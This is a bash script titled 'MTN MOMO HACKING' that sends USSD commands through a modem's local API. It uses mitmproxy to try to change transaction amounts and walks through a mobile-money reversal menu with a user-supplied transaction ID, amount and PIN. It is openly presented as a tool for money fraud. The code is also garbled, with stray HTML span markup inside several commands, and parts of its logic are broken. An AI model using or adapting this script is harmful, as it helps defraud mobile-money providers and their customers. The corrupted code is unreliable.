#!/bin/bash

# Add ASCII art
echo ""
figlet -f standard "MTN MOMO HACKING" | lolcat
echo ""

# Define the get_headers function
function get_headers {
  # Get the response from the API
  response=<span class="math-inline">\(curl \-k \-s \-H <0\>"Accept\: text/html,application/xhtml\+xml,application/xml;q\=0\.9,image/avif,image/webp,image/apng,\*/\*;q\=0\.8,application/signed\-exchange;v\=b3;q\=0\.9"</0\> 'http\://192\.168\.8\.1/api/ussd/send'\)
\# Extract the cookie and token from the headers
cookie\=</span>(echo "<span class="math-inline">response" \| grep \-E 'Set\-Cookie\:' \| cut \-d ';' \-f2 \| cut \-d '\=' \-f2\)
token\=</span>(echo "$response" | grep -E '__RequestVerificationToken:' | cut -d '=' -f2)

  # Return the cookie and token
  if [ -z "$cookie" ] || [ -z "$token" ]; then
    echo "Failed to get cookie and token"
    exit 1
  fi
  echo "$cookie" "$token"
}

# Define the execute_ussd_command function
function execute_ussd_command {
  # Get the function arguments
  local ussd_command=<span class="math-inline">1
\# Send the USSD command using curl and store the response
ussd\_response\=</span>(curl -X POST 'http://192.168.8.1/api/ussd/send' -H "Accept: text/plain" -H "Content-Type: application/json" -d "{\"MSISDN\": \"phoneNumber\", \"Message\": \"$ussd_command\"}" | jq -r '.Message')

  # Check for errors in the USSD response
  if [[ "$ussd_response" == *"Error"* ]]; then
    echo "Failed to execute USSD command: $ussd_command"
    exit 1
  fi
  echo "$ussd_response"
}

# Trap all errors and log them to the console
trap 'echo "Error: <span class="math-inline">?"' ERR
\# Configure mitmproxy and start intercepting traffic
mitmdump \-p 8080
\# Get the cookie and token
cookie\_token\=</span>(get_headers)
cookie=$(echo "<span class="math-inline">cookie\_token" \| cut \-d ' ' \-f1\)
token\=</span>(echo "<span class="math-inline">cookie\_token" \| cut \-d ' ' \-f2\)
\# Get the reverse transaction ID
while true; do
reverse\_transaction\_id\=</span>(dialog --title "Enter the reverse transaction ID" --inputbox "Reverse Transaction ID:" 8 80)
  exitstatus=$?
  if [ $exitstatus = 0 ]; then
    break
  fi
done

# Check if the user canceled the dialog
if [ <span class="math-inline">exitstatus \= 1 \]; then
echo "You chose to cancel\."
exit 1
fi
\# Get the amount to reverse
while true; do
amount\=</span>(dialog --title "Enter the amount to reverse" --inputbox "Amount to Reverse:" 8 80)
  exitstatus=$?
  if [ $exitstatus = 0 ]; then
    break
  fi
done

# Check if the user canceled the dialog
if [ $exitstatus = 1 ]; then
  echo "You chose to cancel."
  exit 1
fi

# Intercept and modify the amount using mitmproxy's CLI tools
mitmproxy \
  -s "flow.filter('host == \"192.168.8.1\" && request.path == \"/api/ussd/send\"')" \
  -s "flow.response.content.text = re.sub(\"amount=(\d+)\", \"amount=$amount\", flow.response.content.text)"
# Execute USSD commands to initiate transaction reversal
execute_ussd_command "*126#"
execute_ussd_command "7"
execute_ussd_command "6"
execute_ussd_command "$reverse_transaction_id"
execute_ussd_command "$amount"
execute_ussd_command "1"
execute_ussd_command "*pin#"

